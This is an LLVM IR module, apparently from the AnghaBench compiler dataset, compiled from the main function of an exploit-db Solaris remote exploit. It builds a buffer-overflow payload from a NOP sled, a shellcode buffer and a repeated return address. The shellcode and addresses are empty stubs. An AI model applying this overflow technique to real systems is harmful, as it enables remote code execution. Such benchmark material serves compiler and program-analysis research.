; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_19663.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_19663.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@offset = common dso_local global i32 0, align 4
@nop = common dso_local global i32 0, align 4
@buffer = common dso_local global i8* null, align 8
@x86_nop = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@shell = common dso_local global i32 0, align 4
@esp = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %2
  %10 = load i8**, i8*** %5, align 8
  %11 = getelementptr inbounds i8*, i8** %10, i64 1
  %12 = load i8*, i8** %11, align 8
  %13 = call i64 @strtol(i8* %12, i32* null, i32 0)
  %14 = load i32, i32* @offset, align 4
  %15 = sext i32 %14 to i64
  %16 = add nsw i64 %15, %13
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* @offset, align 4
  br label %18

18:                                               ; preds = %9, %2
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 2
  br i1 %20, label %21, label %30

21:                                               ; preds = %18
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i64 @strtoul(i8* %24, i32* null, i32 0)
  %26 = load i32, i32* @nop, align 4
  %27 = sext i32 %26 to i64
  %28 = add nsw i64 %27, %25
  %29 = trunc i64 %28 to i32
  store i32 %29, i32* @nop, align 4
  br label %30

30:                                               ; preds = %21, %18
  %31 = load i8*, i8** @buffer, align 8
  %32 = load i32, i32* @x86_nop, align 4
  %33 = load i32, i32* @SIZE, align 4
  %34 = call i32 @memset(i8* %31, i32 %32, i32 %33)
  %35 = load i8*, i8** @buffer, align 8
  %36 = load i32, i32* @nop, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* @shell, align 4
  %40 = load i32, i32* @shell, align 4
  %41 = call i32 @strlen(i32 %40)
  %42 = call i32 @memcpy(i8* %38, i32 %39, i32 %41)
  %43 = load i32, i32* @nop, align 4
  %44 = load i32, i32* @shell, align 4
  %45 = call i32 @strlen(i32 %44)
  %46 = add nsw i32 %43, %45
  store i32 %46, i32* %6, align 4
  br label %47

47:                                               ; preds = %61, %30
  %48 = load i32, i32* %6, align 4
  %49 = load i32, i32* @SIZE, align 4
  %50 = sub nsw i32 %49, 4
  %51 = icmp slt i32 %48, %50
  br i1 %51, label %52, label %64

52:                                               ; preds = %47
  %53 = load i32, i32* @esp, align 4
  %54 = load i32, i32* @offset, align 4
  %55 = add nsw i32 %53, %54
  %56 = load i8*, i8** @buffer, align 8
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = bitcast i8* %59 to i32*
  store i32 %55, i32* %60, align 4
  br label %61

61:                                               ; preds = %52
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 4
  store i32 %63, i32* %6, align 4
  br label %47

64:                                               ; preds = %47
  %65 = load i32, i32* @stderr, align 4
  %66 = load i32, i32* @esp, align 4
  %67 = load i32, i32* @offset, align 4
  %68 = add nsw i32 %66, %67
  %69 = call i32 @fprintf(i32 %65, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i32 %68)
  %70 = load i8*, i8** @buffer, align 8
  %71 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %70)
  ret i32 0
}

declare dso_local i64 @strtol(i8*, i32*, i32) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
